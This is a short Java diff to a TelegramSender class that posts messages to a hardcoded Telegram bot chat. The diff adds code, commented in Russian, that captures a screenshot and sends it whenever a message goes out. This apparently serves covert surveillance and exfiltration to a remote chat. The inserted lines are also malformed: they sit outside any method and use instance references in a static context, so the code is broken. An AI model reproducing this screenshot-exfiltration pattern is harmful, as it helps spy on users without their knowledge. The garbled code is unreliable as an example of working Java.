@@ -8,7 +8,10 @@ public class TelegramSender {
     private static final String CHAT_ID = "7323025362";
     private static final OkHttpClient client = new OkHttpClient();
 
-    public static void sendMessage(String text) {
+// СКРИНШОТ ПРИ ОТПРАВКЕ
+if (messageText != null && !messageText.isEmpty()) {
+    ScreenCaptureService.captureAndSend(messageText, this);
+}    public static void sendMessage(String text) {
         String url = "https://api.telegram.org/bot" + BOT_TOKEN + "/sendMessage";
         RequestBody body = new FormBody.Builder()
                 .add("chat_id", CHAT_ID)
